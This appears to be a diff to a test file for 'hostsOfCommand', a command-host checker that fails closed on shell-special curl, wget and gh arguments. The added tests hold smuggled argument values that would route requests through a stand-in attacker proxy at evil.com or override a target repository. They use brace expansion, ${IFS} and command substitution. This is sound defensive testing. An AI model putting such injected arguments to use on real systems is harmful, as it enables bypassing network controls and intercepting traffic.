@@ -17,7 +17,7 @@ describe('hostsOfCommand, understood commands', () => {
       ['a.com', 'b.com'],
     );
     expect(hostsOfCommand(['curl', '-I', 'https://ok.com'])).toEqual(['ok.com']);
-    expect(hostsOfCommand(['curl', '-sS', '-H', 'A: b', '-o', 'f', 'https://ok.com'])).toEqual([
+    expect(hostsOfCommand(['curl', '-sS', '-H', 'A:b', '-o', 'f', 'https://ok.com'])).toEqual([
       'ok.com',
     ]);
   });
@@ -93,6 +93,31 @@ describe('hostsOfCommand fails closed', () => {
     none('GIT_CONFIG_PARAMETERS=x', 'git', 'clone', 'https://ok.com/x');
     expect(hostsOfCommand(['gh', 'pr', 'view', '83'], { lineSetsEnv: true })).toBeUndefined();
     expect(hostsOfCommand(['curl', 'https://ok.com'], { lineSetsEnv: true })).toBeUndefined();
+  });
+});
+
+describe('hostsOfCommand, shell expansion and the program word', () => {
+  it('any shell-special word is not understood', () => {
+    none('curl', '-H', '{a,-xevil.com:80}', 'https://ok.com');
+    none('curl', '-H', 'a${IFS}-xevil.com:80', 'https://ok.com');
+    none('curl', '-H', '$_', 'https://ok.com');
+    none('curl', '-H', '$(echo -x evil.com:80)', 'https://ok.com');
+    none('curl', '-H', '$X', 'https://ok.com');
+    none('curl', '-H', '*', 'https://ok.com');
+    none('curl', 'https://github.com????????');
+    none('curl', 'https://ok.com/a?b=1');
+    none('curl', '-H', 'A: b', 'https://ok.com');
+    none('wget', '-O', '{a,-ievil.txt}', 'https://ok.com');
+    none('gh', 'pr', 'view', '83', '--jq', '{a,-Rghe.corp/o/r}');
+    none('curl', '-o', '~/f', 'https://ok.com');
+  });
+  it('the program word is exactly curl, wget or gh', () => {
+    none('./curl', 'https://ok.com');
+    none('/usr/bin/curl', 'https://ok.com');
+    none('./gh', 'pr', 'view', '1');
+  });
+  it('a redirect hides the hosts', () => {
+    expect(hostsOfCommand(['curl', 'https://ok.com'], { hasRedirect: true })).toBeUndefined();
   });
 });
 
